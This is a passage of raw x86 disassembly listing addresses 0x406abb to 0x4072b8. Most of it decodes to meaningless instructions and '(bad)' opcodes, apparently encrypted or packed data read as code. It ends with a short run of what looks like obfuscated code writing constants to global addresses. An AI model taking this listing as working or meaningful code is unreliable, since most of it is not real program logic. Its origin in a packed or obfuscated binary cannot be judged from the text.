  406abb:	or     DWORD PTR [ecx-0x26fe318a],0xcdeda2d1
  406ac5:	cdq    
  406ac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac7:	mov    ss,WORD PTR [edi+edi*8-0x63421fdd]
  406ace:	ds mov edi,0x5552ae60
  406ad4:	jecxz  0x406a9f
  406ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ad7:	xlat   BYTE PTR ds:[ebx]
  406ad8:	mov    dh,0x93
  406ada:	inc    ebx
  406adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406adc:	pop    ecx
  406add:	push   ebp
  406ade:	or     dh,BYTE PTR [ebx]
  406ae0:	add    eax,0x70df3840
  406ae5:	dec    ebp
  406ae6:	xchg   BYTE PTR [esi+edx*8],ah
  406ae9:	pop    ebp
  406aea:	fwait
  406aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aec:	and    DWORD PTR [ebp-0x45],ecx
  406aef:	icebp  
  406af0:	or     bh,BYTE PTR [eax+0x95ee8a5]
  406af6:	push   ebp
  406af7:	xlat   BYTE PTR ds:[ebx]
  406af8:	in     al,dx
  406af9:	or     al,0x1d
  406afb:	mov    ds:0x14f55672,eax
  406b00:	xchg   esi,eax
  406b01:	icebp  
  406b02:	cmp    ah,BYTE PTR [esi-0x496f5c2f]
  406b08:	push   edi
  406b09:	bound  ebx,QWORD PTR [ebp-0x7329a7dc]
  406b0f:	mov    ah,0x33
  406b11:	fstp   TBYTE PTR [eax-0xaefe98f]
  406b17:	jp     0x406b50
  406b19:	ins    BYTE PTR es:[edi],dx
  406b1a:	daa    
  406b1b:	ret    0xfe81
  406b1e:	mov    bh,0xa1
  406b20:	ret    0x69b5
  406b23:	les    ecx,FWORD PTR [eax-0x21bbed31]
  406b29:	xor    BYTE PTR [ebp-0x27],dh
  406b2c:	enter  0xb6e5,0x70
  406b30:	xchg   ebx,eax
  406b31:	por    mm5,mm3
  406b34:	mov    dh,0x17
  406b36:	in     eax,dx
  406b37:	sub    DWORD PTR [eax-0x51366bdc],ebx
  406b3d:	jb     0x406ad4
  406b3f:	nop
  406b40:	cld    
  406b41:	shl    DWORD PTR [edi],0x2d
  406b44:	out    dx,eax
  406b45:	out    0xbf,eax
  406b47:	pop    es
  406b48:	xor    dh,BYTE PTR [ebx]
  406b4a:	test   BYTE PTR [ecx+0x5c663ee0],bh
  406b50:	retf   0xe7fb
  406b53:	fs xor ch,dh
  406b56:	or     eax,0x305cf4d6
  406b5b:	scas   al,BYTE PTR es:[edi]
  406b5c:	ins    DWORD PTR es:[edi],dx
  406b5d:	sub    eax,0xf67da6ed
  406b62:	cmp    ah,cl
  406b64:	addr16 sbb al,0x63
  406b67:	lahf   
  406b68:	mov    eax,0x86fcd7e1
  406b6d:	xor    dh,BYTE PTR [ecx+0x3d021b25]
  406b73:	(bad)  
  406b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b76:	mov    eax,0x158041a2
  406b7b:	add    al,BYTE PTR [ebx]
  406b7d:	inc    ecx
  406b7e:	pop    es
  406b7f:	std    
  406b80:	xchg   ebx,eax
  406b81:	fld    QWORD PTR [edx-0x260efe39]
  406b87:	or     ch,ah
  406b89:	loop   0x406bff
  406b8b:	xor    eax,0x68aa0c4a
  406b90:	sbb    ecx,eax
  406b92:	add    al,0x38
  406b94:	out    0x54,al
  406b96:	jmp    DWORD PTR [edx]
  406b98:	push   ss
  406b99:	add    dh,BYTE PTR [ecx+0x20995293]
  406b9f:	mov    ebx,0x902d1183
  406ba4:	sub    bh,BYTE PTR [edi]
  406ba6:	dec    ebx
  406ba7:	dec    edi
  406ba8:	stc    
  406ba9:	dec    esp
  406baa:	es mov ah,0x44
  406bad:	sub    ch,dh
  406baf:	repnz imul BYTE PTR [ebp+eax*4+0x55]
  406bb4:	rcl    DWORD PTR [ecx+esi*8+0x7c98666b],cl
  406bbb:	push   0xffffffab
  406bbd:	fnstenv [edx+0x3e]
  406bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bc1:	xor    al,0x6e
  406bc3:	pop    eax
  406bc4:	sbb    ah,BYTE PTR [ebx-0x4b]
  406bc7:	fist   WORD PTR [ebx+0x43]
  406bca:	jge    0x406be2
  406bcc:	sub    DWORD PTR [ebp+ecx*1+0x47fc7c84],0xe
  406bd4:	add    al,0x46
  406bd6:	mov    cl,0x2c
  406bd8:	(bad)
  406bdb:	mov    ebx,0x3f0b612a
  406be0:	mov    dl,0x0
  406be2:	fcmovnb st,st(5)
  406be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406be5:	sti    
  406be6:	lahf   
  406be7:	pop    edx
  406be8:	daa    
  406be9:	test   edi,ecx
  406beb:	mov    esi,0xfeb3a008
  406bf0:	fiadd  WORD PTR [ecx+eiz*8+0x50939270]
  406bf7:	mov    esi,0x9d678b73
  406bfc:	mov    esp,0x5c2eea5d
  406c01:	or     BYTE PTR [edx+edi*1],dh
  406c04:	popf   
  406c05:	jne    0x406c06
  406c07:	adc    eax,DWORD PTR fs:[edi+0x5a]
  406c0b:	and    BYTE PTR [ecx-0x15],ah
  406c0e:	push   esi
  406c0f:	dec    ebx
  406c10:	mov    esp,0xf9174627
  406c15:	push   esi
  406c16:	fldcw  WORD PTR ds:0x6af99ab2
  406c1c:	mov    cl,0x92
  406c1e:	mov    ebp,0xd69d22c7
  406c23:	imul   edx,DWORD PTR [edi+0x7f519e52],0x58a00e7
  406c2d:	aad    0xd6
  406c2f:	les    edi,FWORD PTR [edx-0x21]
  406c32:	mov    ecx,0x44998a46
  406c37:	dec    ebx
  406c38:	icebp  
  406c39:	xor    ecx,DWORD PTR [eax]
  406c3b:	jmp    0x2f1a:0x6457ad3d
  406c42:	hlt    
  406c43:	dec    BYTE PTR [eax]
  406c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c46:	lock xor BYTE PTR [edx+0x77],al
  406c4a:	push   ss
  406c4b:	or     DWORD PTR [edi+0x49236d65],ecx
  406c51:	xchg   edi,eax
  406c52:	retf   0xb113
  406c55:	xor    DWORD PTR [ecx],ebx
  406c57:	and    BYTE PTR [ebp+0x219889d5],0xa
  406c5e:	adc    al,0x57
  406c60:	sub    al,0xd7
  406c62:	retf   
  406c63:	lods   eax,DWORD PTR ds:[esi]
  406c64:	(bad)  ds:0x258f5526
  406c6a:	mov    bl,BYTE PTR [ecx-0x2dd427a5]
  406c70:	je     0x406c33
  406c72:	xor    edi,DWORD PTR [edi]
  406c74:	mov    edi,ebx
  406c76:	push   edx
  406c77:	push   ebx
  406c78:	adc    eax,0xcedba7ce
  406c7d:	add    ecx,DWORD PTR [ebx+eiz*4+0x5b]
  406c81:	iret   
  406c82:	pop    DWORD PTR [edi-0x98b9b7d]
  406c88:	iret   
  406c89:	imul   DWORD PTR [eax+0xcbb751c]
  406c8f:	jmp    0x406cac
  406c91:	xor    al,BYTE PTR [edx]
  406c93:	scas   eax,DWORD PTR es:[edi]
  406c94:	pop    eax
  406c95:	sub    eax,0x528270da
  406c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c9b:	push   ebx
  406c9c:	inc    ebx
  406c9d:	mov    DWORD PTR [ebp-0x295ed261],esp
  406ca3:	cmp    ebx,DWORD PTR ds:0x9b9b5c90
  406ca9:	xlat   BYTE PTR ds:[ebx]
  406caa:	imul   esp,DWORD PTR [ecx+0x6508a1ff],0xf02951e5
  406cb4:	inc    esi
  406cb5:	add    DWORD PTR [ebp-0x3d],0x140da3f0
  406cbc:	mov    DWORD PTR [eax-0x3f8c04e8],ecx
  406cc2:	mov    DWORD PTR [esi-0xd],eax
  406cc5:	(bad)  
  406cc7:	iret   
  406cc8:	pop    eax
  406cc9:	int    0xb8
  406ccb:	test   DWORD PTR [edx+0x31579a5b],0x8ced33fc
  406cd5:	xchg   ebp,eax
  406cd6:	pop    edx
  406cd7:	mov    ch,cl
  406cd9:	push   es
  406cda:	and    al,0xe2
  406cdc:	xchg   ecx,eax
  406cdd:	cmc    
  406cde:	je     0x406c68
  406ce0:	inc    esp
  406ce1:	add    DWORD PTR [ebp+0x25],ebp
  406ce4:	mov    ds:0x70de2d29,eax
  406ce9:	cmp    bl,BYTE PTR ds:0xde2c1298
  406cef:	sahf   
  406cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf1:	mov    bh,0xe9
  406cf3:	xlat   BYTE PTR ds:[ebx]
  406cf4:	and    eax,0x2a6985ba
  406cf9:	outs   dx,BYTE PTR ds:[esi]
  406cfa:	popa   
  406cfb:	jae    0x406cee
  406cfd:	adc    eax,0x811a0ef
  406d02:	adc    eax,edx
  406d04:	fiadd  WORD PTR [ebx]
  406d06:	adc    eax,0x63a3f3d0
  406d0b:	mov    dl,0xa4
  406d0d:	popf   
  406d0e:	cdq    
  406d0f:	dec    ecx
  406d10:	add    eax,0xeebfa663
  406d15:	mov    ds:0x24746305,al
  406d1a:	or     BYTE PTR [edi],bl
  406d1c:	jmp    0x406cda
  406d1e:	jo     0x406ca6
  406d20:	inc    edx
  406d21:	adc    eax,0xc2fcb0f1
  406d26:	cmp    DWORD PTR [esp+ebp*2+0x28],edi
  406d2a:	fist   WORD PTR [ebx+eiz*1+0x71]
  406d2e:	arpl   WORD PTR [ebp-0x79],sp
  406d31:	rcl    ebp,1
  406d33:	mov    ds:0x618b3c26,eax
  406d38:	cmp    esp,DWORD PTR [esi]
  406d3a:	dec    eax
  406d3b:	push   cs
  406d3c:	xor    BYTE PTR [ecx+edi*4],al
  406d3f:	or     BYTE PTR [ecx],ah
  406d41:	pop    ebp
  406d42:	ret    0x328b
  406d45:	dec    eax
  406d46:	sbb    eax,0xa46cfc6c
  406d4b:	sahf   
  406d4c:	xchg   esp,eax
  406d4d:	je     0x406d01
  406d4f:	mov    esp,0xdaaca71f
  406d54:	sbb    BYTE PTR [ebx-0x714e205a],al
  406d5a:	jbe    0x406d2c
  406d5c:	test   al,0x90
  406d5e:	dec    esi
  406d5f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  406d61:	add    ecx,DWORD PTR [eax+esi*2+0x2b]
  406d65:	mov    eax,ds:0x620894ad
  406d6a:	dec    esp
  406d6b:	shl    BYTE PTR [edx+0x1e],1
  406d6e:	pop    eax
  406d6f:	arpl   WORD PTR [eax+0x3f],bx
  406d72:	fdivr  st,st(0)
  406d74:	dec    ecx
  406d75:	scas   eax,DWORD PTR es:[edi]
  406d76:	stos   BYTE PTR es:[edi],al
  406d77:	pop    ss
  406d78:	adc    DWORD PTR [esi-0x41599194],ecx
  406d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d7f:	add    bl,BYTE PTR [edi-0x1a438ca]
  406d85:	mov    eax,ds:0x5dc493ef
  406d8a:	inc    esp
  406d8b:	mov    edx,0x90d56dec
  406d90:	adc    BYTE PTR [esi],cl
  406d92:	dec    ecx
  406d93:	int    0xa3
  406d95:	lahf   
  406d96:	repnz les edi,FWORD PTR [bx+di]
  406d9a:	scas   eax,DWORD PTR es:[edi]
  406d9b:	xor    edi,DWORD PTR [edi+0x3]
  406d9e:	sub    edi,edx
  406da0:	xchg   ebp,eax
  406da1:	push   ds
  406da2:	jmp    DWORD PTR [edi]
  406da4:	dec    ecx
  406da5:	or     edi,ebx
  406da7:	jecxz  0x406d70
  406da9:	mov    edx,0x8799c635
  406dae:	jmp    0x406dea
  406db0:	loop   0x406db6
  406db2:	mov    bl,0xe2
  406db4:	jmp    0x82d8:0xa96e46d9
  406dbb:	repz fld TBYTE PTR [edi]
  406dbe:	xor    eax,ebx
  406dc0:	adc    edi,DWORD PTR [edi-0x72afed86]
  406dc6:	ds dec eax
  406dc8:	fmul   QWORD PTR [esi+0x2d]
  406dcb:	nop
  406dcc:	and    cl,BYTE PTR [eax-0x51]
  406dcf:	mov    bl,0xd0
  406dd1:	arpl   WORD PTR [eax-0x39],si
  406dd4:	dec    ebx
  406dd5:	push   cs
  406dd6:	lock push 0x36
  406dd9:	pop    ds
  406dda:	or     al,0xb1
  406ddc:	lods   eax,DWORD PTR ds:[esi]
  406ddd:	and    DWORD PTR [eax+ebx*1-0x6f],esi
  406de1:	shr    dh,cl
  406de3:	push   0xffffffd5
  406de5:	jmp    esp
  406de7:	sbb    DWORD PTR [ebp+0x3e],esp
  406dea:	arpl   WORD PTR [eax-0x77],si
  406ded:	cmp    eax,0x360cf7c3
  406df2:	inc    eax
  406df3:	cmp    BYTE PTR [edi-0x2fdf5dfb],dh
  406df9:	dec    edx
  406dfa:	pop    esi
  406dfb:	movups xmm5,XMMWORD PTR [ebp+0x29459450]
  406e02:	shl    DWORD PTR ds:0xea7f3d6d,0xeb
  406e09:	aad    0xdc
  406e0b:	sbb    BYTE PTR [ecx+eax*1-0x7fa54d3e],ah
  406e12:	sbb    DWORD PTR [edx+0x25d90d84],0xffffffdb
  406e19:	lods   al,BYTE PTR ds:[esi]
  406e1a:	jmp    0x406e0b
  406e1c:	inc    edx
  406e1d:	fsubr  QWORD PTR [eax-0xcd3f9af]
  406e23:	mov    ds:0x2624dd56,al
  406e28:	les    ecx,FWORD PTR [edx-0x40693eb5]
  406e2e:	pop    edx
  406e2f:	fstp   QWORD PTR [esi+0x42]
  406e32:	fs push ebx
  406e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e35:	cwde   
  406e36:	xchg   ecx,eax
  406e37:	or     ah,BYTE PTR [ecx+esi*8-0x2cdfa196]
  406e3e:	xchg   edx,eax
  406e3f:	pop    ebp
  406e40:	pop    edi
  406e41:	hlt    
  406e42:	(bad)  
  406e43:	(bad)  
  406e44:	mov    ch,0xbb
  406e46:	inc    edx
  406e47:	outs   dx,DWORD PTR ds:[esi]
  406e48:	push   0x3b09195d
  406e4d:	fwait
  406e4e:	and    DWORD PTR [esi],ebp
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x434647,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x4a203128]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e77
  406e7b:	sbb    DWORD PTR [eax+esi*4+0x6a],eax
  406e7f:	jmp    0xa81d:0x6cf72f33
  406e86:	jmp    0x406e9c
  406e88:	pop    ds
  406e89:	mov    edi,0xed1fe2a8
  406e8e:	fidivr DWORD PTR [ecx+0x73]
  406e91:	push   edi
  406e92:	(bad)  [ecx-0x647b798b]
  406e98:	retf   0x38ec
  406e9b:	inc    eax
  406e9c:	popa   
  406e9d:	rol    BYTE PTR [esi+esi*4-0x72810898],0x86
  406ea5:	loop   0x406f04
  406ea7:	jecxz  0x406e92
  406ea9:	mov    ch,0x55
  406eab:	pop    eax
  406eac:	or     eax,0xea93277a
  406eb1:	lds    esi,FWORD PTR [eax]
  406eb3:	xchg   ebp,eax
  406eb4:	shl    BYTE PTR [esi-0x5cfd016a],1
  406eba:	outs   dx,DWORD PTR ds:[esi]
  406ebb:	sahf   
  406ebc:	(bad)  
  406ebd:	in     al,dx
  406ebe:	and    eax,DWORD PTR [edi]
  406ec0:	push   ss
  406ec1:	lods   eax,DWORD PTR ds:[esi]
  406ec2:	or     eax,0xbc91668b
  406ec7:	jnp    0x406e64
  406ec9:	(bad)  
  406eca:	les    ebx,FWORD PTR [ecx-0xf5dceb1]
  406ed0:	cmp    DWORD PTR [ecx+edx*8-0x5d3b2e4c],edx
  406ed7:	cld    
  406ed8:	mov    bl,0x9f
  406eda:	xchg   edx,eax
  406edb:	(bad)  
  406edc:	xor    bl,BYTE PTR [ebp+ebx*1+0x3f]
  406ee0:	inc    ebx
  406ee1:	inc    eax
  406ee2:	clc    
  406ee3:	and    al,BYTE PTR [edi+0x5b94996]
  406ee9:	mov    eax,fs:0x156bd7e5
  406eef:	repnz aas 
  406ef1:	icebp  
  406ef2:	inc    ecx
  406ef3:	add    al,0x15
  406ef5:	add    BYTE PTR [esi+0x109d9e4c],0xe2
  406efc:	jl     0x406f5d
  406efe:	rcl    BYTE PTR [ecx+edx*8-0x72f360ce],cl
  406f05:	inc    esp
  406f06:	mov    eax,ds:0x1f842c9
  406f0b:	sbb    BYTE PTR [eax-0x18],dh
  406f0e:	adc    dl,bl
  406f10:	stos   BYTE PTR es:[edi],al
  406f11:	sbb    eax,0x48117a9d
  406f16:	mov    WORD PTR [ebp+0x82d24d2],fs
  406f1c:	bnd ret 0xd055
  406f20:	add    dh,BYTE PTR [edx]
  406f22:	es fxch st(3)
  406f25:	pop    ebp
  406f26:	daa    
  406f27:	out    dx,eax
  406f28:	jmp    0x5588353b
  406f2d:	inc    eax
  406f2e:	dec    ebx
  406f2f:	retf   
  406f30:	outs   dx,DWORD PTR ds:[esi]
  406f31:	outs   dx,BYTE PTR ds:[esi]
  406f32:	mov    ds:0x6821b0ce,al
  406f37:	js     0x406eeb
  406f39:	(bad)  [esi]
  406f3b:	call   0x359a:0x82b6b3d7
  406f42:	and    DWORD PTR [esi+0x19],ebx
  406f45:	sbb    DWORD PTR [esi+0x48209d5c],ebx
  406f4b:	in     eax,dx
  406f4c:	dec    edi
  406f4d:	mov    ecx,0x6080ff3f
  406f52:	das    
  406f53:	pop    ss
  406f54:	addr16 inc esi
  406f56:	add    esp,DWORD PTR [ebx]
  406f58:	and    DWORD PTR [eax+0x77],edi
  406f5b:	mov    ch,0x5
  406f5d:	sbb    BYTE PTR [edx],ah
  406f5f:	mov    DWORD PTR [esi-0x40],esp
  406f62:	arpl   WORD PTR [eax+0x22da40bd],di
  406f68:	dec    eax
  406f69:	push   edx
  406f6a:	sub    eax,0xebf6a405
  406f6f:	test   al,0xca
  406f71:	sahf   
  406f72:	xor    bl,BYTE PTR [ecx-0x54e0ac83]
  406f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f79:	sub    BYTE PTR [eax+0x2d640c16],dh
  406f7f:	or     ecx,DWORD PTR [esi+0x22]
  406f82:	sbb    al,0x88
  406f84:	lods   eax,DWORD PTR ds:[esi]
  406f85:	mov    ebp,0xe2d53941
  406f8a:	or     BYTE PTR [ebp+0x5d],al
  406f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f8e:	mov    cl,0x69
  406f90:	pop    ebx
  406f91:	shr    edx,cl
  406f93:	sbb    BYTE PTR [ecx],bh
  406f95:	(bad)  
  406f96:	clc    
  406f97:	shl    BYTE PTR [ebx+0x42],cl
  406f9a:	and    eax,0xea496477
  406f9f:	sahf   
  406fa0:	adc    ebx,esp
  406fa2:	dec    ecx
  406fa3:	cdq    
  406fa4:	out    0x6f,al
  406fa6:	mov    ebp,DWORD PTR [edx-0x4e476791]
  406fac:	jl     0x406fd5
  406fae:	or     eax,0xec138cc8
  406fb3:	add    BYTE PTR [edi-0x5c],dl
  406fb6:	push   edi
  406fb7:	call   0xc83b1172
  406fbc:	jl     0x406f79
  406fbe:	inc    esp
  406fbf:	inc    eax
  406fc0:	test   eax,0x3b7eafa6
  406fc5:	mov    ebp,0x8dae6014
  406fca:	add    eax,0xedf1f262
  406fcf:	jle    0x406f7c
  406fd1:	rcl    DWORD PTR [ebx+0x3b],0x31
  406fd5:	jmp    0x45a19b3f
  406fda:	mov    WORD PTR [ebp+0x40],fs
  406fdd:	cmp    BYTE PTR [ecx-0x297c151c],0x84
  406fe4:	push   eax
  406fe5:	ins    DWORD PTR es:[edi],dx
  406fe6:	ins    DWORD PTR es:[edi],dx
  406fe7:	mov    ecx,0xe224188c
  406fec:	dec    edx
  406fed:	shr    BYTE PTR [edx-0x72],cl
  406ff0:	push   ds
  406ff1:	xchg   esi,eax
  406ff2:	out    dx,al
  406ff3:	inc    edx
  406ff4:	retf   
  406ff5:	or     dh,BYTE PTR [ecx]
  406ff7:	xor    BYTE PTR [ebx],al
  406ff9:	mov    eax,0xd1960b7e
  406ffe:	mov    cl,BYTE PTR [edx+ebp*1+0xdde74cf]
  407005:	loope  0x407025
  407007:	data16 cmp al,0xab
  40700a:	popa   
  40700b:	jmp    0xa52d:0xec727dc6
  407012:	out    dx,eax
  407013:	inc    eax
  407014:	dec    eax
  407015:	xor    al,0x52
  407017:	xchg   ecx,eax
  407018:	adc    edx,esi
  40701a:	mov    eax,ds:0xe0202912
  40701f:	inc    esp
  407020:	fs ins BYTE PTR es:[edi],dx
  407022:	push   ecx
  407023:	dec    edi
  407024:	jle    0x407096
  407026:	push   es
  407027:	pop    edx
  407028:	sti    
  407029:	out    dx,eax
  40702a:	arpl   WORD PTR [edi-0x4309ee84],di
  407030:	call   0x9da75d01
  407035:	jno    0x40704a
  407037:	out    dx,al
  407038:	retf   
  407039:	inc    ecx
  40703a:	mov    ds:0x3b6ae255,eax
  40703f:	and    al,0x95
  407041:	sub    DWORD PTR [ebx-0x628da0d],0xaf41e99b
  40704b:	xor    BYTE PTR [ecx],dh
  40704d:	mov    ds:0x844a0877,eax
  407052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407053:	bound  ecx,QWORD PTR [edi]
  407055:	mov    cl,0xdc
  407057:	fmul   QWORD PTR [edx+0x34]
  40705a:	xchg   BYTE PTR [edi],ch
  40705c:	or     eax,0xc9508234
  407061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407062:	(bad)  
  407063:	or     al,0x5a
  407065:	jl     0x407057
  407067:	bound  eax,QWORD PTR [edx-0x10]
  40706a:	inc    edi
  40706b:	stos   DWORD PTR es:[edi],eax
  40706c:	into   
  40706d:	xchg   ecx,eax
  40706e:	xchg   BYTE PTR [esi-0x2669d361],dh
  407074:	bound  ebp,QWORD PTR [eax+edi*8+0x4eefabb1]
  40707b:	inc    ebp
  40707c:	sbb    DWORD PTR [ebx+0x78ba7b82],edi
  407082:	cmp    eax,0xe339ab4
  407087:	iret   
  407088:	popa   
  407089:	and    edi,DWORD PTR [esp+ebp*2-0x284113e]
  407090:	cwde   
  407091:	inc    esi
  407092:	lea    ecx,[ecx+0x66080612]
  407098:	out    dx,al
  407099:	xchg   ecx,eax
  40709a:	push   ds
  40709b:	sub    bl,BYTE PTR [edx]
  40709d:	jp     0x40703e
  40709f:	push   0xfdb12a4e
  4070a4:	in     eax,0x2a
  4070a6:	inc    edx
  4070a7:	and    esp,DWORD PTR [edx]
  4070a9:	(bad)  
  4070aa:	mov    edx,0xcfdac83c
  4070af:	sti    
  4070b0:	test   al,0x14
  4070b2:	mov    al,ds:0x7833a205
  4070b7:	not    DWORD PTR [edx-0x21141a26]
  4070bd:	sbb    cl,BYTE PTR [edx]
  4070bf:	pusha  
  4070c0:	js     0x407082
  4070c2:	aad    0x95
  4070c4:	idiv   BYTE PTR [ecx]
  4070c6:	icebp  
  4070c7:	aad    0xf6
  4070c9:	ret    0x6a6d
  4070cc:	mov    WORD PTR [esp+eax*1],es
  4070cf:	mov    BYTE PTR [ecx],ch
  4070d1:	out    0x8d,al
  4070d3:	xchg   esi,eax
  4070d4:	cmp    al,0x1d
  4070d6:	loop   0x4070eb
  4070d8:	popa   
  4070d9:	stc    
  4070da:	cmp    esi,DWORD PTR [eax+eax*1]
  4070dd:	or     DWORD PTR [edi-0x4182cc26],esp
  4070e3:	repz ret 
  4070e5:	xchg   BYTE PTR [edi],dh
  4070e7:	sti    
  4070e8:	sbb    esi,eax
  4070ea:	fwait
  4070eb:	loopne 0x40713e
  4070ed:	fisub  DWORD PTR [ecx+0x2c5c2039]
  4070f3:	ret    
  4070f4:	pop    eax
  4070f5:	pop    ss
  4070f6:	cli    
  4070f7:	or     DWORD PTR [eax-0x46],edx
  4070fa:	mov    BYTE PTR [edi-0x6f813e49],dh
  407100:	inc    ebx
  407101:	mov    cl,0x17
  407103:	out    dx,eax
  407104:	push   0x4b
  407106:	mov    bh,0xbe
  407108:	xchg   BYTE PTR [esi],bl
  40710a:	ficomp DWORD PTR [eax+eiz*2+0x5a]
  40710e:	push   ds
  40710f:	loopne 0x4070f2
  407111:	sub    ch,al
  407113:	cld    
  407114:	scas   eax,DWORD PTR es:[edi]
  407115:	call   0xb702:0xed0eae00
  40711c:	jp     0x4070dc
  40711e:	pop    ecx
  40711f:	rol    DWORD PTR [edi-0x7fff9146],cl
  407125:	bnd jle 0x407128
  407128:	leave  
  407129:	in     al,0xf6
  40712b:	or     edx,0x7a
  40712e:	test   BYTE PTR [esi+0x5b3168e3],0x5f
  407135:	(bad)  
  407136:	dec    esi
  407137:	mov    ds:0xc648c79a,al
  40713c:	mov    dh,0xd2
  40713e:	mov    bl,BYTE PTR [edx+0x48d668a7]
  407144:	mov    WORD PTR [ebx+0x1b865ec],ds
  40714a:	xor    al,0xc6
  40714c:	push   0x45
  40714e:	jl     0x4071c2
  407150:	in     al,dx
  407151:	lods   al,BYTE PTR ds:[esi]
  407152:	sbb    ecx,DWORD PTR [edx]
  407154:	xchg   BYTE PTR [ebx],al
  407156:	lock adc al,0x61
  407159:	mov    eax,ds:0x5f37eb6e
  40715e:	dec    edi
  40715f:	test   BYTE PTR [edx+0x5b],bl
  407162:	jno    0x40717c
  407164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407165:	test   BYTE PTR [ebp+ebx*2-0x4],0xe7
  40716a:	rcr    ebx,cl
  40716c:	jae    0x407147
  40716e:	lds    esi,FWORD PTR [ebp-0x15fb8b24]
  407174:	jp     0x4071b1
  407176:	xor    ch,al
  407178:	or     edx,DWORD PTR [edx+ecx*1]
  40717b:	cmp    BYTE PTR [esi],dh
  40717d:	jnp    0x407125
  40717f:	nop
  407180:	ficomp DWORD PTR [eax+0x91eaf72]
  407186:	push   es
  407187:	xor    eax,0xbc4aaef0
  40718c:	addr16 sbb al,0x5d
  40718f:	mov    esp,0x5aeac0e5
  407194:	add    BYTE PTR fs:[ebx+0x65e45743],dh
  40719b:	ins    BYTE PTR es:[edi],dx
  40719c:	sbb    esi,edi
  40719e:	test   BYTE PTR [edx],0x97
  4071a1:	mov    ah,0xf1
  4071a3:	cmp    dh,BYTE PTR [edi+0x8f72027]
  4071a9:	pop    ebp
  4071aa:	xchg   edx,eax
  4071ab:	mov    esp,0xcef64206
  4071b0:	add    al,0x51
  4071b2:	inc    eax
  4071b3:	xchg   ebp,eax
  4071b4:	fdivr  QWORD PTR [edi+edi*1]
  4071b7:	cmp    eax,0xcea9ed23
  4071bc:	xchg   esi,eax
  4071bd:	sbb    esi,ebx
  4071bf:	sbb    BYTE PTR [eax],0x60
  4071c2:	inc    ecx
  4071c3:	test   DWORD PTR [eax-0x4e0b1ea3],ebx
  4071c9:	inc    ebp
  4071ca:	sbb    DWORD PTR [ebx+0x3e],eax
  4071cd:	mov    dl,0xd7
  4071cf:	inc    esp
  4071d0:	ins    DWORD PTR es:[edi],dx
  4071d1:	inc    ebx
  4071d2:	mov    edx,0x91b01d0b
  4071d7:	imul   ebp,DWORD PTR [ebx+0x4d],0xc5ff8f0e
  4071de:	and    cl,cl
  4071e0:	js     0x4071b9
  4071e2:	enter  0xa933,0x47
  4071e6:	sar    DWORD PTR [eax+0x5f],0x20
  4071ea:	push   es
  4071eb:	lods   al,BYTE PTR ds:[esi]
  4071ec:	out    0x93,al
  4071ee:	(bad)  
  4071f0:	lea    ecx,[ecx-0x520f800]
  4071f6:	pusha  
  4071f7:	xor    edi,esp
  4071f9:	mov    edx,db3
  4071fc:	xchg   ecx,eax
  4071fd:	dec    ebx
  4071fe:	retf   0xbc93
  407201:	mov    bl,0x7a
  407203:	(bad)  
  407204:	pop    ebx
  407205:	loope  0x4071c3
  407207:	fucomip st,st(1)
  407209:	xchg   ecx,eax
  40720a:	adc    eax,edx
  40720c:	stc    
  40720d:	mov    ebp,0x1a5e81a9
  407212:	jmp    0xbaaf:0x588ff200
  407219:	xchg   DWORD PTR [edi],edx
  40721b:	mov    bh,0xcf
  40721d:	and    BYTE PTR [esi-0x32099c23],bh
  407223:	(bad)  [esi+edx*1+0x20c999b3]
  40722a:	dec    eax
  40722b:	sub    BYTE PTR [edx-0xc2cb7a9],0x18
  407232:	jmp    0x94e5:0x60ba2c99
  407239:	sbb    edi,edx
  40723b:	test   DWORD PTR [edx],esi
  40723d:	imul   edx,DWORD PTR [eax+0x66750007],0xffffffcd
  407244:	iret   
  407245:	inc    ebx
  407246:	jns    0x4072b7
  407248:	fldenv ds:0xd445c7db
  40724e:	cmp    DWORD PTR [edi+0x0],ecx
  407251:	add    bh,al
  407253:	add    eax,0x4345ef
  407258:	scas   al,BYTE PTR es:[edi]
  407259:	adc    eax,0x23b0000
  40725e:	mov    DWORD PTR ds:0x4345df,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434713,0x4345e3
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434607
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x4345fb,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x43464b,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x43463b,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
